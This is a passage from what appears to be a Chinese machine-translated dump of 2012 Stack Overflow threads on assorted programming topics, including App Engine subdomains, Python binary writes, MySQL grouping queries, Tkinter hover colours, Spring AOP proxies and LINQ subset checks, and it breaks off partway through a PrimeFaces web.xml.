我正在 Windows XP、Windows Vista、Windows 7 和 Windows 8 上测试我的应用程序。除了 Windows XP 上的四种特定语言外，所有 15 种语言都可以在所有版本的 Windows 上正常工作。而不是预期的资源字符（如我在 Vista、7 和 8 中获得的那些），在 Windows XP 中，我看到的只是 ko（韩语）、ja（日语）、zh- 的“方形”或“块”字符CHS（简体中文）和 zh-CHT（繁体中文）。

我已经用谷歌搜索了几次。这似乎不是其他人以前遇到过的问题？？？

关于导致这种情况的任何想法，以及如何解决它？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:12:31.863

通常没有安装这种语言，所以很可能没有包含这些字符的字体。

转到“区域设置”并检查是否安装了字体。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:30:20.037

您需要[安装东亚语言文件](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/int_pr_install_languages.mspx?mfr=true)。

从上面的链接：

> 在语言选项卡上的补充语言支持下，选中安装东亚语言文件复选框。

和

> 东亚语言包括中文、日文和韩文。大多数其他语言的文件由 Windows 自动安装在您的计算机上。

# google-app-engine - 如何在谷歌应用引擎上将子域设置为“sub.domain.appspot.com”？

> ID：10239287
> 
> 赞同：0
> 
> 时间：2012-04-20T02:04:17.700
> 
> 标签：google-app-engine, subdomain

我知道如何在谷歌应用引擎上将应用设置为 myapp.appspot.com，但我希望将 a.myapp.appspot.com 和 b.myall.appspot.com 用于同一应用的不同界面。正如谷歌指令所说，这是支持的：

> appspot.com 域还支持 subdomain.your_app_id.appspot.com 形式的子域，其中 subdomain 可以是域名一部分中允许的任何字符串（不是 .）。以这种方式发送到任何子域的请求都会路由到您的应用程序。
> 
> [来自[https://developers.google.com/appengine/docs/python/runtime](https://developers.google.com/appengine/docs/python/runtime)]

但我无法弄清楚如何设置。有没有人在appspot上创建过子域？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T02:37:01.207

您无需执行任何操作即可进行设置。它只是工作。

也就是说，要实现不同的接口，您需要检测调用者使用的主机名。你可以把这个放进去`HTTP_HOST`。`HTTP_HOST`将具有全名（即“a.myapp.appspot.com”或“b.myapp.appspot.com”）。

更新：如果使用 HTTPS，则答案不再适用，来自[通过 URL 的路由](https://cloud.google.com/appengine/docs/python/modules/routing#routing_via_url)：

> **注意：** Google[建议](http://googleonlinesecurity.blogspot.com/2014/08/https-as-ranking-signal_6.html)使用 HTTPS 协议向您的应用发送请求。Google 不会为在 appspot.com 上托管的双通配符域颁发 SSL 证书。因此，对于 HTTPS，您必须使用字符串“-dot-”而不是“.”。分隔子域，如下面的示例所示。您可以使用简单的“。” 使用您自己的自定义域或 HTTP 地址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-11-24T12:32:21.497

您可以利用以下`SERVICE_ID-dot-`概念：

```
https://**SERVICE_ID-dot-**PROJECT_ID.REGION_ID.r.appspot.com
```

```
https://myall.appspot.com/

https://a-dot-myall.appspot.com/
https://b-dot-myall.appspot.com/ 
```

在这里，带有 a-dot-myall.appspot.com 的请求将被路由到名为 的服务`a`。
但是如果被命名的服务`a`不存在，那么请求将被路由到 myall.appspot.com，这被称为[软路由](https://cloud.google.com/appengine/docs/standard/python/how-requests-are-routed#:%7E:text=Requests%20are%20received%20by%20any%20version%20that%20is%20configured%20for%20traffic%20in%20the%20targeted%20service.%20If%20the%20service%20that%20you%20are%20targeting%20does%20not%20exist,%20the%20request%20gets%20soft%20routed)。因此，即使该服务不存在，您也可以在您的应用程序中收到请求后，
使用 伪造任何 url并做出路由决定。`myall.appspot.com`实际上，我们已经`server_name`在`nginx`.

[软路由解释](https://cloud.google.com/appengine/docs/standard/python/how-requests-are-routed#soft_routing)

# python - Python字符串和整数写入文件？

> ID：10239288
> 
> 赞同：-1
> 
> 时间：2012-04-20T02:04:29.997
> 
> 标签：python, types

我是 Python 新手，所以我不确定我应该怎么做。

我有一个要写入文件的字符串列表。每个字符串前面都需要一个等于字符串长度的 32 位整数。

在将其写入文件之前，我需要将所有要写入文件的数据。在 C# 中，我会在编写之前将所有内容存储在一个字节数组中，但我不知道在 Python 中该做什么。我应该使用列表，还是有更好的数据类型？信息应该如何存储？

编辑：它看起来像的一个例子是：

00 00 00 04 74 65 73 74

大端整数的四个字节，后跟字符串。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T02:12:53.447

如果您的数据存储在名为“data”的列表中，并且您希望输出转到名为“data.out”的文件，则以下代码将完成此操作：

```
data = ['this', 'is', 'a', 'complicated and long', 'test']

with open('data.out', 'w') as outfp:
    for d in data:
        outfp.write('%4d %s\n' %(len(d), d)) 
```

产量：

```
 4 this
  2 is
  1 a
 20 complicated and long
  4 test 
```

作为文件“data.out”中的输出。请注意，%4d 中的 '4' 有助于将数字与前导空格对齐，以便输出格式很好。

或者，如果您想要字符的 ASCII 整数值：

```
with open('data.out', 'w') as outfp:
    for d in data:
       outfp.write('%4d %s\n' %(len(d), ' '.join([str(ord(i)) for i in d]))) 
```

你会得到

```
 4 116 104 105 115
  2 105 115
  1 97
 20 99 111 109 112 108 105 99 97 116 101 100 32 97 110 100 32 108 111 110 103
  4 116 101 115 116 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T02:25:28.053

您可以使用 lambda 表达式根据字符串和格式要求轻松创建新列表，例如：

```
strings = ['abc', 'abcde', 'abcd', 'abcdefgh']
outputs = map(lambda x: "%d %s" % (len(x), x), strings) # ['3 abc', '5 abcde', '4 abcd', '8 abcdefgh']
f = open("file.out", 'w')
data = '\n'.join(outputs) # Concat all strings in list, separated by line break
f.write(data)
f.close() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T02:08:23.020

根据您的要求，这将生成一个包含所有数据的大字符串：

```
>>> l = ["abc", "defg"]
>>> data = '\n'.join("%d %s" % (len(x), x) for x in l)
>>> data
3 abc
4 defg 
```

然后将其写入文件，如下所示：

```
f = open("filename", "w")
f.write(data)
f.close() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T02:10:08.983

假设您有一个存储在其中的字符串列表，`list_of_strings`并且您打开了一个文件以写入`file_handle`. 进行如下操作（未经测试）

```
for line in list_of_strings:
    length_of_string = len(line)
    line = str(length_of_string) + " " + line
    file_handle.write(line) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T02:14:29.697

字典是可以接受的。就像是：

```
strings = ['a', 'aa', 'aaa', 'aaaa'] #you'd get these
data = dict() #stores values to be written.
for string in strings:
    length = len(string)
    data.update({string: length})
#this is just a check, you would do something similar to write the values to a file.
for string, length in data.items():
    print string, length 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-20T02:30:02.110

很抱歉造成混淆，我应该包括我需要整数字节的方式，而不仅仅是字符串之前的整数。

我最终得到了类似的东西：

```
import struct

output=''
mystr = 'testing str'
strlen = len(mystr)
output += struct.pack('>i',strlen) + mystr 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-20T04:02:48.773

将数据存储在列表中应该没问题。可以在编写文件时计算长度。棘手的部分是将它们编写为二进制而不是 ascii。

要处理二进制数据，您可能需要使用[struct](http://docs.python.org/library/struct.html)模块。它的 pack 功能将让您将字符串的长度转换为它们的二进制表示。由于它返回一个字符串，因此您可以轻松地将其与要输出的字符串组合。

下面的示例似乎适用于 Python 2.7

```
import struct
strings = ["a", "ab", "abc"]

with open("output.txt", "wb") as output:
    for item in strings:
        output.write("{0}{1}".format(struct.pack('>i', len(item)), item)) 
```

# java - 正则表达式替换字符实例，但不在括号内

> ID：10239289
> 
> 赞同：2
> 
> 时间：2012-04-20T02:04:43.383
> 
> 标签：java, regex

我在尝试创建的正则表达式中需要一些帮助，我通常很擅长这些，但是这个让我卡住了......

我需要用 \d 动态替换字符串中的数字 9 （创建一个新的正则表达式）。这些是一些可以预期的示例字符串：

```
X(29)

9(5)

99

X(29)V999S 
```

现在，在您回答得太快之前，我们不能触摸括号中的数字...我在这里查看了其他几个答案，这个解决方案中可能有一些东西，但我似乎无法适应它 -[用于拆分的正则表达式不被单引号或双引号包围时使用空格的字符串](https://stackoverflow.com/questions/366202/regex-for-splitting-a-string-using-space-when-not-surrounded-by-single-or-double)

到目前为止，我想出了

```
line.replaceAll("[^(\\d)]??9[^)]??", "\\d"); 
```

这给了我

```
X(2\d)

\d(5)

\d\d

X(2\d)V\d\d\dS 
```

任何人都有任何想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:12:31.057

鉴于您的规则非常简单，但很难用正则表达式实现，为什么不自己动手呢？遍历字符串并创建一个新的字符串来跟踪状态（在括号中或外面）。

巴里

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T02:30:01.703

那这个呢？

```
(?!\([^\(]*)9(?![^\(]*\)) 
```

# php - MySQL：SELECT 条件语句可以根据每个记录参数进行分组吗？

> ID：10239290
> 
> 赞同：2
> 
> 时间：2012-04-20T02:04:58.717
> 
> 标签：php, mysql, sql, database

我有一份我正在为使用 MySQL 作为数据库的应用程序重写的报告。目前，该报告正在使用来自 php 的大量繁重工作，它创建数组，将它们重新存储到临时数据库中，然后从该临时数据库生成结果。

重写所有这些代码的主要目标之一是简化和清理我的许多旧代码，我想知道是否可以简化以下过程，或者甚至更好地仅在 MySQL 上完成，让 php 只处理 dstribution数据到客户端。

我将使用一个虚构的场景来描述我正在尝试做的事情：

让我们假设下表（请注意，在实际应用中，该表的信息实际上是从多个表中提取的，但为了清楚起见，这应该能够说明问题）：

```
+----+-----------+--------------+--------------+
| id | location  | date_visited | time_visited |
+----+-----------+--------------+--------------+
| 1  | place 1   | 2012-04-20   | 11:00:00     |
+----+-----------+--------------+--------------+
| 2  | place 2   | 2012-04-20   | 11:06:00     |
+----+-----------+--------------+--------------+
| 3  | place 1   | 2012-04-20   | 11:06:00     |
+----+-----------+--------------+--------------+
| 4  | place 3   | 2012-04-20   | 11:20:00     |
+----+-----------+--------------+--------------+
| 5  | place 2   | 2012-04-20   | 11:21:00     |
+----+-----------+--------------+--------------+
| 6  | place 1   | 2012-04-20   | 11:22:00     |
+----+-----------+--------------+--------------+
| 7  | place 3   | 2012-04-20   | 11:23:00     |
+----+-----------+--------------+--------------+ 
```

我需要的报告要求我首先列出每个地点，然后列出对该地点的访问次数。但是，需要注意的是，使查询变得困难的原因是，访问需要有一个时间间隔才能计入此报告。

例如：假设访问任何给定地点的间隔是 10 分钟。

第一个条目被自动锁定，因为没有以前的条目，第二个条目也是如此，因为“place 2”还没有其他条目。但是，在第三个条目上，会检查地点 1 的最后一次访问时间，该时间小于定义的时间间隔（10 分钟），因此报告将忽略此条目并继续下一个条目。

本质上，我们正在逐案检查时间间隔不是从最后一个条目开始，而是从同一位置的最后一个条目开始。

报告的结果最终应如下所示：

```
+----+-----------+--------+
| id | location  | visits |
+----+-----------+--------+
| 1  | place 1   | 2      |
+----+-----------+--------+
| 2  | place 2   | 2      |
+----+-----------+--------+
| 3  | place 3   | 1      |
+----+-----------+--------+ 
```

我当前的基本实现通过以下步骤来获取上述结果集：

1.  MySQL 查询创建一个临时表，其中包含所有必需位置及其 ID 的列表。
2.  MySQL查询选择指定时间范围内的所有访问数据并将其传递给PHP。
3.  PHP & MySQL 用访问数据填充临时表，PHP 在这里完成繁重的工作。
4.  MySQL 从临时表中选择数据并将其返回给客户端进行显示。

我的问题是。有没有办法单独使用 MySQL 来完成大部分工作？我一直在寻找的是一种编写 MySQL 查询的方法，该查询可以通过 select 语句解析并仅选择满足上述条件的访问，然后最终按位置对其进行分组并为我提供 COUNT(*)每组。

我真的不知道这是否可能，并且希望那里的一位数据库专家能够阐明如何做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:34:31.147

假设您有一个结构略有不同的表（可能是临时表）：

```
CREATE TABLE  `visits` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `location` varchar(45) NOT NULL,
  `visited` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `loc_vis` (`location`,`visited`)
) ENGINE=InnoDB;

INSERT INTO visits (location, visited) VALUES
('place 1', '2012-04-20 11:00:00'),
('place 2', '2012-04-20 11:06:00'),
('place 1', '2012-04-20 11:06:00'),
('place 3', '2012-04-20 11:20:00'),
('place 2', '2012-04-20 11:21:00'),
('place 1', '2012-04-20 11:22:00'),
('place 1', '2012-04-20 11:23:00'); 
```

如您所见，它在 ( `location`, `visited`) 上有一个索引。那么下面的查询会使用索引，也就是按照索引的顺序读取数据，并返回你期望的结果：

```
SELECT
  location,
  COUNT(IF(@loc <> @loc:=location,
           @vis:=visited,
           IF(@vis + INTERVAL 10 MINUTE < @vis:=visited,
              visited,
              NULL))) as visit_count
FROM visits,
     (SELECT @loc:='', @vis:=FROM_UNIXTIME(0)) as init
GROUP BY location; 
```

结果：

```
+----------+-------------+
| location | visit_count |
+----------+-------------+
| place 1  |           2 |
| place 2  |           2 |
| place 3  |           1 |
+----------+-------------+
3 rows in set (0.00 sec) 
```

**一些解释**：

解决方案的关键是它淡化了 SQL 的功能特性，并使用 MySQL 实现细节（他们说这很糟糕，永远不要再这样做了！！！）。

1.  如果表有索引（列值的有序表示）并且在查询中使用了索引，则意味着表中的数据按索引的顺序读取。

2.  GROUP BY 操作将受益于索引（因为数据已经在那里分组），如果适用，将选择它。

3.  SQL 中的所有聚合函数（`COUNT(*)`具有特殊含义的除外）都会检查每一行，只有当它不为 NULL 时才使用该值（上面 COUNT 中的表达式在错误条件下返回 NULL）

4.  其余的只是对行列表的程序迭代的一个hacky表示（按索引的顺序读取，按 排序`location asc, visisted asc`）：我初始化一些变量，如果位置与前一行不同 - 我计算它，如果不是 - 我检查间隔，如果错误则返回 NULL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:21:00.007

您可以使用 INSERT / SELECT 语句填充临时表。

见手册。[http://dev.mysql.com/doc/refman/5.0/en/insert-select.html](http://dev.mysql.com/doc/refman/5.0/en/insert-select.html)

我会在 SELECT 语句中使用 GROUP BY 来缩小范围。

对于可以作为 COUNT 操作填充的访问列，我认为它也可以作为 INSERT / SELECT 的一部分执行。

见手册。[http://dev.mysql.com/doc/refman/5.1/en/counting-rows.html](http://dev.mysql.com/doc/refman/5.1/en/counting-rows.html)

所以你的 SQL 可能看起来像这样。

```
INSERT INTO temp 
    SELECT * FROM (
        SELECT *,COUNT('visits') 
             FROM source AS table1 
             GROUP BY location
             WHERE date_visited > xxxx AND date_visited < xxxx
        )
       AS table2 
```

说真的，这不是我的想法，但它应该会给你一些关于如何构建 SQL 的想法。但是您可能只使用一个好的查询就可以完成报告。

# python - 使用 Tkinter 将鼠标悬停在文本上时更改文本颜色？

> ID：10239292
> 
> 赞同：6
> 
> 时间：2012-04-20T02:05:03.027
> 
> 标签：python, tkinter

所以我在 Tkinter 的画布上有一堆文本，我想让它在鼠标悬停在文本上时文本颜色发生变化。对于我的生活，我不知道该怎么做，而且似乎没有很多关于 Tkinter 的信息在任何地方。

```
for city in Cities:
    CityText = Cities[i]
    board.create_text(CityLocs[CityText][0], CityLocs[CityText][1], text=CityText, fill="white")
    CityText = Cities[i]
    i = i + 1 
```

这只是我将文本放置在画布上的代码，尽管我不确定还要发布什么来表达我的观点。Tkinter 中是否没有“悬停”功能或类似的功能？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T04:17:00.857

You can bind arbitrary events (mouse, keyboard, window manager and possibly others) to any widget in Tkinter.

A nice documentation for that is at [http://effbot.org/tkinterbook/tkinter-events-and-bindings.htm](https://web.archive.org/web/20201111211515/http://effbot.org/tkinterbook/tkinter-events-and-bindings.htm) -

For example, to bind color changes to widgets when mouse hover over them:

```
import Tkinter
from functools import partial

def color_config(widget, color, event):
    widget.configure(foreground=color)

parent = Tkinter.Tk()
text = Tkinter.Label(parent, text="Hello Text")
text.bind("<Enter>", partial(color_config, text, "red"))
text.bind("<Leave>", partial(color_config, text, "blue"))
text.pack()

Tkinter.mainloop() 
```

The use of `functools.partial` here allows you to re-use a variable for your text (Label) widget, since you are appending them to a list. If one would settle to simply using lambda you would have a disgusting surprise, as the variable referring to the widget in the body of the lambda function would always point to the last value it had inside the `for` loop. `functools.partial` "freeze" the variable content at the time it is called, and yields a new function.

However, since you are placing the items in a Canas, you can either set the "fill" and "fillactive" attributes for each item, as in @mgilson's answer, or you can create a more generic class to handle not only hovering, but other events you choose to implement later.

If your class has a `__call__` method, you can pass an instance of it to the `bind` method of the canvas, so that the resulting object is called for each event on the canvas. In this case, mouse-motion event suffices:

```
from Tkinter import *

class Follower(object):
    def __init__(self,on_color="#fff", off_color="#000"):
        self.on_color = on_color
        self.off_color = off_color
        self.previous_item = None
    def hover(self, canvas, item, x, y):
        x1, y1, x2, y2 = canvas.bbox(item)
        if x1 <= x <= x2 and y1 <= y <= y2:
            return True
        return False

    def __call__(self, event):
        canvas = event.widget
        item = canvas.find_closest(event.x, event.y)
        hovering = self.hover(canvas, item, event.x, event.y)
        if (not hovering or item != self.previous_item) and self.previous_item is not None:
            canvas.itemconfig(self.previous_item, fill=self.off_color)
        if hovering:
            canvas.itemconfig(item, fill=self.on_color)
        self.previous_item = item

master=Tk()
canvas=Canvas(master)
canvas.pack()
canvas.create_text((40,20),text="Hello World!",fill="black")
canvas.create_text((60,80),text="FooBar",fill="black")
canvas.bind("<Motion>", Follower())
master.mainloop() 
```

(ps. canvas and text placement example borrowed from @mgilson's answer)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T03:01:29.880

这是一个适用于 OS-X 的（不可否认的）相当蹩脚的例子......

```
from Tkinter import *

master=Tk()
canvas=Canvas(master)
canvas.pack()
canvas.create_text((20,20),activefill="red",text="Hello World!",fill="black")
master.mainloop() 
```

参考： [http ://effbot.org/tkinterbook/canvas.htm](http://effbot.org/tkinterbook/canvas.htm)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-22T16:57:14.157

这已经内置在 Tkinter 中。创建文本时使用“activefill”选项来指定您想要的颜色。

有关详细信息，请参阅以下链接。Effbot.org/tkinterbook 是我去 tkinter 的地方。 [http://effbot.org/tkinterbook/canvas.htm#Tkinter.Canvas.create_text-method](http://effbot.org/tkinterbook/canvas.htm#Tkinter.Canvas.create_text-method)

# c++ - C++类依赖于函数，但函数依赖于类

> ID：10239296
> 
> 赞同：0
> 
> 时间：2012-04-20T02:05:57.940
> 
> 标签：c++, declaration

我无法编译这段代码，因为函数声明依赖于类声明，而类声明依赖于函数声明。请帮忙。

```
#include <iostream>
using namespace std;

void simulate(Policy& p);

class Policy {
public:
    Policy(int);
    int x;
    void eval();
};

int main() {
    Policy p(23);
    return 0;
}

Policy::Policy(int y) { x = y; }
void Policy::eval() { simulate(this); }

void simulate(Policy& p) { cout << ++p.x << endl; } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T02:07:40.107

将函数的原型放在类定义的下方，但在成员函数的上方。

# php - 如何将 XML 属性转换为文本节点

> ID：10239298
> 
> 赞同：1
> 
> 时间：2012-04-20T02:06:09.453
> 
> 标签：php, xml, json

我有一个 PHP 脚本，它从远程服务器中提取 XML 文件，并使用 simplexml_load_string 和 json_encode 将其转换为 JSON。但是， simplexml_load_string 似乎忽略了内联属性，如下所示：

```
<AxisFeedrate dataItemId="iid7" timestamp="2012-03-21T15:15:41-04:00" sequence="7" name="Yfrt" subType="ACTUAL" units="MILLIMETER/SECOND">UNAVAILABLE</AxisFeedrate> 
```

在这种情况下，JSON 表示将是 {AxisFeedrate: 'UNAVAILABLE'}

但是，我需要这些属性可用。我一直在接近的一个想法是替换字符串以将属性转换为文本节点，如下所示：

```
<AxisFeedrate>
  <dataItemId>iid7</dataItemId>
  <timestamp>2012-03-21T15:15:41-04:00</timestamp>
  <sequence>7</sequence>
  <name>Yfrt</name>
  <subType>ACTUAL</subType>
  <units>MILLIMETER/SECOND"</units>
  <value>UNAVAILABLE</value>
</AxisFeedrate> 
```

我可以使用常规查找/替换将属性转换为它们自己的标记元素，但是我无法将原始文本值包装在值标记中，至少使用查找/替换时是这样。

有什么好的方法可以做到这一点？上面的 XML 块位于不同数据项的许多相似块的中间，所以我不能只是从将第一个关闭 > 替换为 >...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:31:45.807

您可以使用 SimpleXML 本身来读取属性。

例子：

```
<?php
$xml=simplexml_load_string('<AxisFeedrate dataItemId="iid7" timestamp="2012-03-21T15:15:41-04:00" sequence="7" name="Yfrt" subType="ACTUAL" units="MILLIMETER/SECOND">UNAVAILABLE</AxisFeedrate>');

foreach($xml->attributes() as $k=>$v) {
    echo $k." -> ".(string)$v."\n";

}
?> 
```

* * *

输出：

```
dataItemId -> iid7
timestamp -> 2012-03-21T15:15:41-04:00
sequence -> 7
name -> Yfrt
subType -> ACTUAL
units -> MILLIMETER/SECOND 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:17:47.910

试试这个正则表达式：`([\w]*?)="(.*?)"`用这个替换`<$1>$2</$1>\n`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T02:59:23.027

您应该使用 SimpleXML。但请注意，您必须将值显式转换为字符串类型，否则您将获得对象。

```
$xml_string = <<<XML
<AxisFeedrate 
dataItemId="iid7" 
timestamp="2012-03-21T15:15:41-04:00" 
sequence="7" 
name="Yfrt" 
subType="ACTUAL" 
units="MILLIMETER/SECOND"
>UNAVAILABLE</AxisFeedrate>
XML;

$xml = simplexml_load_string($xml_string);

$axis_info = array('value' => (string)$xml);

foreach($xml -> attributes() as $attr => $val) {
    $axis_info[$attr] = (string) $val;
}

echo json_encode(array("AxisFeedrate" => $axis_info)); 
```

## 更新：

这将为您提供更通用的版本，但请注意属性被转换为数组，并且这只适用于单个元素：

```
$xml_string = <<<XML
<AxisFeedrate dataItemId="iid7" timestamp="2012-03-21T15:15:41-04:00" sequence="7" name="Yfrt" subType="ACTUAL" units="MILLIMETER/SECOND">UNAVAILABLE</AxisFeedrate>
XML;

$xml = simplexml_load_string($xml_string);

$obj_name = $xml -> getName();

$attributes = (array) $xml->attributes();

$axis_info[$obj_name] = $attributes["@attributes"];
$axis_info[$obj_name]['value'] = (string) $xml;

echo json_encode($axis_info); 
```

# java - spring aop 代理对象

> ID：10239299
> 
> 赞同：6
> 
> 时间：2012-04-20T02:06:15.863
> 
> 标签：java, spring

我现在正在读一本用韩语写的春季书，我的英语很糟糕。请理解。

在书中，它说Spring的AOP如果使用Interface，则使用动态代理启动类，如果不使用Interface，则使用CGLIB启动类。我不太清楚这是什么意思。你能帮我理解它的深层含义吗？

我不知道这个问题是否愚蠢。但我只是好奇 THX。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-20T03:06:44.300

代理本质上是客户端和对象之间的中介，因此它实现了对象的非最终方法。代理接口相对简单，因为接口只是需要实现的方法列表，便于拦截方法调用。

Java 中的[Proxy](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/reflect/Proxy.html)类是一个实现在运行时指定的接口列表的类。然后，代理有一个与之关联的[InvocationHandler](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/reflect/InvocationHandler.html)，它将代理上的方法调用委托给被代理的对象。它充当*间接*级别，这样方法不会在对象本身上调用，而是在其代理上调用。只有`InvocationHandler`一个需要实现的方法：

```
public Object invoke(Object proxy, Method method, Object[] args) 
```

同时，调用该方法的客户端无法分辨代理及其底层对象表示之间的区别，它也不应该关心。

与接口相比，动态代理类并不那么简单。虽然 Java`Proxy`只是一个接口或一组接口的运行时实现，但对象不必*实现*接口。因此，代理类需要生成字节码，这就是 cglib 等库发挥作用的地方。cglib 提供对代理类的支持，因为它可以动态生成字节码（即类文件），这意味着它可以在运行时以 Java`Proxy`可以在运行时实现接口的方式扩展类。

代理有很多用途。一种这样的用途是延迟加载。延迟加载允许仅在需要时加载对象图中的对象。我们可以在需要访问它们时即时加载它们，而不是立即将它们全部加载到内存中，这可能是昂贵且资源密集的，例如迭代对象集合。我们不是加载整个集合，而是一次加载一个小集合。这可以通过代理来实现。代理代表延迟加载的对象。对象本身（可能是从数据库加载的）在其代理上调用方法之前不会加载。代理拦截方法调用，然后将对象加载到内存中并将方法调用委托给它。

这是延迟加载实现的示例：

```
public abstract class LazilyLoadedObject implements InvocationHandler {

    private Object target;

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (target == null) {
            target = loadObject();
        }
        return method.invoke(target, args);
    }

    /**
     * Loads the proxied object. This might be an expensive operation
     * or loading lots of objects could consume a lot of memory, so
     * we only load the object when it's needed.
     */
     protected abstract Object loadObject();

} 
```

以上`InvocationHandler`将被传递给代理，以便代理上调用的方法将由`InvocationHandler`. 处理程序检查对象是否已加载。如果没有，它将调用`loadObject()`，这可能是某种检索对象的数据库查询。

代理非常强大，因为它们允许拦截方法调用。AOP 中就是这种情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:03:08.550

[Java 动态代理](http://docs.oracle.com/javase/1.3/docs/guide/reflection/proxy.html)是 Java 语言的一个反射元素，它允许用户在运行时创建接口的代理。作为反射包的一部分，它是 Java 的一部分，并且随 JRE/JDK 一起提供。

[CGLIB](http://cglib.sourceforge.net/)是一个代码生成库，它能够在运行时扩展 Java 类。因此，Spring 利用此功能为其 AOP 库代理非接口。

# c# - 如何检查一个char数组是否包含另一个char数组中的每个元素？

> ID：10239306
> 
> 赞同：3
> 
> 时间：2012-04-20T02:07:32.730
> 
> 标签：c#, .net, linq, entity-framework, linq-to-entities

> **可能重复：**
> [LINQ：检查一个数组是否是另一个数组的子集](https://stackoverflow.com/questions/332973/linq-check-whether-an-array-is-a-subset-of-another)

我正在尝试确定是否有一种方法可以使用 LINQ 来查找子集数组中的每个元素是否都在超集数组中。例如这个超集：

```
{'w','o','k','r','d','o'} 
```

以下将是一个有效的子集：

```
{'o','k','w','r'} 
```

虽然这些是无效的：

```
{'o','k','w','r','s'}
{'w','o','k','r','d','o','s'} 
```

实际的超集是我在内存中的一个字符数组。实际子集是数据库表中的一个值。我正在尝试使用 LINQ to EF 从表中获取满足此条件的所有值。这是我到目前为止所尝试的：

```
char[] letterArray = letters.ToCharArray();
return we.Words.Where(t =>     letterArray.Join(t.Word.ToCharArray(),
                                    f => f,
                                    s => s, (f, s) => new { s }).Count() == t.Word.Length
                                ).Select(t => t.Word).ToArray(); 
```

但是当我运行它时，我得到了错误：

> '无法创建'System.Char'类型的常量值。此上下文仅支持原始类型（“例如 Int32、String 和 Guid”）。

有没有办法解决这个错误？有没有更简单的方法来做我在这里尝试的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:11:21.650

```
char[] t1 = {'w','o','k','r','d','o'};

char[] t2 = {'o','k','w','r'};

bool isSubset = !t2.Except(t1).Any(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:17:11.053

LINQ 为这类工作内置了像 except 和 Intersect 这样的扩展。

```
char[] superset = { 'w', 'o', 'k', 'r', 'd', 'o' };
char[] subset1 = { 'o', 'k', 'w', 'r' };
char[] subset2 = { 'w', 'o', 'k', 'r', 'd', 'o', 's' };

bool subValid1 = !subset1.Except(superset).Any(); //true
bool subValid2 = !subset2.Except(superset).Any(); //false 
```

# ruby - 如何在 OSX 10.7 上打包 ruby shoes 应用程序

> ID：10239310
> 
> 赞同：27
> 
> 时间：2012-04-20T02:07:54.133
> 
> 标签：ruby, macos, package, shoes, dmg

我一直在使用 Ruby Shoes 制作应用程序。我对结果很满意，并想与一些朋友分享。但是，GUI 打包器在 OSX 中不起作用，Windows 打包器似乎只生成一个`.shy`文件。我一直在四处寻找解决方案，但我一个都不明白。有人可以清楚地解释如何将 Ruby Shoes 应用程序打包为 DMG 或 EXE 文件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-03T22:29:18.097

就个人而言，我更喜欢使用[green_shoes](https://github.com/ashbb/green_shoes)。Green_shoes 是您在 ruby​​ 代码中需要的纯 ruby​​ gem，而不是打包 ruby​​ 代码的程序。这样，您可以使用诸如[ocra 之](http://ocra.rubyforge.org/)类的程序将您的 ruby​​ 文件转换为 exe。虽然这是一种 hack，但我觉得这比要求你的用户安装鞋子来运行你的程序要好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-15T23:15:35.270

看一下这个。
[将 Shoes.app 编译/打包成独立的 Mac.app？](https://stackoverflow.com/questions/5770446/compiling-package-a-shoes-app-to-a-standalone-mac-app)
[如何？] “通过一起编译你的应用程序和鞋子。这就是我使用 Hackety Hack 所做的。完全有效。”

# eclipse - Primefaces 标签在 Eclipse Facelets 项目中未被识别

> ID：10239311
> 
> 赞同：0
> 
> 时间：2012-04-20T02:08:01.677
> 
> 标签：eclipse, jsf-2, primefaces, facelets

我正在尝试制作一个简单的 PrimeFaces 示例，例如他们网站上的教程。[我基本上和这个用户](https://stackoverflow.com/questions/7219372/simple-primefaces-application-not-working)有完全相同的问题，但我没有像他那样的空 jar 文件。h: 标签渲染得很好，但是 p: 标签在 HTML 中显示为 p: 标签。PrimeFaces 3.1.1 和 3.2 也有同样的问题。这是我的 web.xml 文件。

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" id="WebApp_ID" version="2.5">
  <display-name>jsf</display-name>
  <welcome-file-list>
    <welcome-file>Login.xhtml</welcome-file>
  </welcome-file-list>
  <context-param>
